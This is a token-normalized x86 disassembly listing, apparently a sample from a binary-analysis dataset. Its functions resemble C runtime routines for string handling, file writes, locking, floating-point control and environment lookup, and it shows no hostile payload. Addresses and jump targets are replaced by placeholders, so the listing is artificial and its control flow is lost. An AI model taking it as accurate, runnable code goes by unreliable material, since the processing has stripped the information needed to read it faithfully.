mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_4136da
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_41373b
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_417f7a
mov ebx eax
add esp 0x4
call sub_417f7a
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_417688
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_4176b9
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_417750
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_41784e
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4129af
mov [ eax ] 0x9
call sub_4129b8
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4188c0
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_4178b3
push esi
mov edi eax
call sub_41891f
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_4178b3
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_41887e
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_4129af
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_41293c
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_417926
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4129af
mov [ eax ] 0x9
call sub_4129b8
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4188c0
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_41798b
push esi
mov edi eax
call sub_41891f
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_41798b
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_4178b3
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_4129af
mov [ eax ] 0x1c
call sub_4129b8
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_41293c
pop ecx
call sub_4129af
mov [ eax ] 0x9
call sub_4129b8
mov [ eax ] esi
jmp r-xdata
sub_417b16
inc [ rw-data ]
push 0x1000
call sub_410b8c
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_417b5a
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_417b83
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_415ce0
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_415ce0
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_41098a
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_417c3f
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_4136da
pop ecx
retn
sub_417c6e
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_4136da
pop ecx
retn
sub_417c91
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_41373b
pop ecx
retn
sub_417cc0
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_41373b
pop ecx
retn
sub_417ce3
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417d3c
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_4136da
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_41373b
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417d3c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_4129af
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_417da5
push ebp
mov ebp esp
push ecx
push esi
fwait
fnstcw [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_417df0
mov esi eax
mov eax [ ebp + 0xc ]
not eax
and esi eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or esi eax
push esi
call sub_417e82
pop ecx
mov [ ebp + 0xc ] eax
pop ecx
fldcw [ ebp + 0xc ]
mov eax esi
pop esi
leave
retn
sub_417df0
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push ebp
test bl 0x1
push edi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or al 0x8
test bl 0x10
je r-xdata
or al 0x4
test bl 0x20
je r-xdata
or al 0x2
test bl 0x2
je r-xdata
or al 0x1
movzx ecx bx
push esi
mov edx ecx
mov esi 0xc00
mov edi 0x300
and edx esi
mov ebp 0x200
je r-xdata
or eax 0x80000
and ecx edi
pop esi
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp ecx ebp
jne r-xdata
or ah 0x1
cmp edx 0x800
je r-xdata
retn
or eax 0x40000
pop edi
pop ebp
test bh 0x10
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp edx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_417e82
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
push 0x1
pop eax
test bl 0x4
je r-xdata
or al 0x4
test bl 0x2
je r-xdata
or al 0x8
test bl 0x1
je r-xdata
or al 0x10
test ebx 0x80000
je r-xdata
or al 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
mov esi 0x200
je r-xdata
or al 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or ah 0x4
cmp ecx esi
je r-xdata
retn
or ah 0x10
pop esi
test ebx 0x40000
pop ebx
je r-xdata
or eax esi
jmp r-xdata
or ah 0x8
jmp r-xdata
cmp ecx edx
jne r-xdata
or ah 0xc
jmp r-xdata
sub_417f0b
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x41
jl r-xdata
push [ esp + 0x10 ]
call sub_417f7a
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_4136da
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x5a
jg r-xdata
push esi
call edi
push 0x13
call sub_41373b
pop ecx
jmp r-xdata
add eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_417f7a
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_41596a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_418045
mov eax [ esp + 0x8 ]
push esi
push 0x20
cdq
pop ecx
idiv ecx
push 0x1f
mov esi eax
mov eax [ esp + 0x10 ]
cdq
idiv ecx
pop ecx
mov eax [ esp + 0x8 ]
sub ecx edx
or edx 0xffffffff
shl edx cl
not edx
test [ eax + esi * 4 ] edx
jne r-xdata
xor eax eax
pop esi
retn
inc esi
cmp esi 0x3
jge r-xdata
push 0x1
pop eax
pop esi
retn
lea eax [ eax + esi * 4 ]
inc esi
add eax 0x4
cmp esi 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
sub_41808e
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x20
mov ebx [ esp + 0x14 ]
cdq
pop ecx
idiv ecx
mov esi eax
mov eax [ esp + 0x14 ]
cdq
idiv ecx
lea edi [ ebx + esi * 4 ]
push edi
push 0x1f
pop ecx
push 0x1
pop eax
sub ecx edx
shl eax cl
push eax
push [ edi ]
call sub_418af9
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_418af9
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_4180e4
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
push 0x20
pop ecx
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x1 ]
push 0x20
mov eax ebx
pop esi
cdq
idiv ecx
push 0x1f
mov ecx eax
mov eax ebx
cdq
idiv esi
mov eax [ ebp + 0x8 ]
pop esi
push 0x1
mov [ ebp - 0x8 ] ecx
lea eax [ eax + ecx * 4 ]
mov [ ebp + 0xc ] eax
sub esi edx
pop edx
mov ecx esi
shl edx cl
test [ eax ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax ] edx
mov eax [ ebp - 0x8 ]
inc eax
cmp eax ecx
jge r-xdata
inc ebx
push ebx
push [ ebp + 0x8 ]
call sub_418045
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
sub ecx eax
lea edi [ edx + eax * 4 ]
xor eax eax
[ edi ]
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_41808e
pop ecx
mov [ ebp - 0x4 ] eax
pop ecx
sub_418170
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push 0x3
sub ecx eax
pop edx
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_418197
mov eax [ esp + 0x4 ]
xor ecx ecx
xor eax eax
retn
inc ecx
add eax 0x4
cmp ecx 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_4181b2
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
mov edi [ ebp + 0x8 ]
pop ebx
or esi 0xffffffff
cdq
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
cdq
idiv ecx
and [ ebp + 0xc ] 0x0
mov ecx edx
shl esi cl
sub ebx edx
not esi
mov eax [ edi ]
mov ecx eax
and ecx esi
mov [ ebp - 0x8 ] ecx
mov ecx edx
shr eax cl
or eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov ecx ebx
add edi 0x4
shl eax cl
dec [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov edi [ ebp - 0xc ]
push 0x2
pop ebx
mov esi edi
push 0x8
pop ecx
shl esi 0x2
mov eax [ ebp + 0x8 ]
and [ ecx + eax ] 0x0
mov edx [ ebp + 0x8 ]
mov eax ecx
sub eax esi
mov eax [ eax + edx ]
mov [ ecx + edx ] eax
jmp r-xdata
cmp ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec ebx
sub ecx 0x4
jns r-xdata
sub_41823f
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx ecx [ eax + 0xa ]
mov ebx ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
mov edi [ ebp + 0x10 ]
and ebx 0x7fff
sub ebx 0x3fff
mov [ ebp - 0x8 ] ecx
shl eax 0x10
cmp ebx 0xffffc001
mov [ ebp - 0x4 ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_418170
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4180e4
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
xor esi esi
push eax
call sub_418197
test eax eax
pop ecx
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx [ edi + 0x8 ]
cmp ebx ecx
jge r-xdata
inc ebx
xor eax eax
lea eax [ ebp - 0xc ]
push eax
call sub_41818b
pop ecx
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_41818b
pop ecx
jmp r-xdata
cmp edi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ edi + 0xc ]
mov edi [ edi + 0x10 ]
shl esi cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0xc ]
cmp edi 0x40
jne r-xdata
cmp ebx [ edi ]
jl r-xdata
sub eax ebx
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_418170
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_4181b2
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4180e4
mov eax [ edi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4181b2
add esp 0x20
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
push [ edi + 0xc ]
mov esi [ edi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add esi ebx
call sub_4181b2
pop ecx
pop ecx
lea eax [ ebp - 0xc ]
push eax
call sub_41818b
push [ edi + 0xc ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_4181b2
mov esi [ edi + 0x14 ]
add esp 0xc
add esi [ edi ]
push 0x1
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_4183d7
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_418c9a
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4183ab
add esp 0x24
leave
retn
sub_418404
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_418c9a
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4183c1
add esp 0x24
leave
retn
sub_418431
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
test ebx ebx
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_411a10
inc eax
push eax
push edi
push esi
call sub_411580
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
dec eax
cmp [ eax ] 0x39
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax ]
mov [ eax ] 0x30
jmp r-xdata
sub_4184a8
push ebp
mov ebp esp
sub esp 0x28
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_418504
pop ecx
lea eax [ ebp - 0x28 ]
pop ecx
lea esi [ ebp - 0xc ]
push eax
push 0x0
push 0x11
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_41916b
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
movsx eax [ ebp - 0x26 ]
mov [ esi ] eax
movsx eax [ ebp - 0x28 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_415bf0
add esp 0x20
mov [ esi + 0xc ] edi
mov eax esi
pop edi
pop esi
leave
retn
sub_418504
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ax [ edx + 0x6 ]
mov edi 0x7ff
mov ecx eax
and eax 0x8000
shr ecx 0x4
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov edx [ eax ]
add ecx ecx
mov ebx edx
shr ebx 0x1f
or ebx ecx
lea ecx [ edx + edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ebx
add edi 0xffff
mov ecx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
mov eax [ ebp + 0x8 ]
or ecx [ ebp - 0x4 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4185c3
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_411a10
pop ecx
mov edi eax
call sub_41943d
test eax eax
jne r-xdata
push eax
call sub_411a10
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
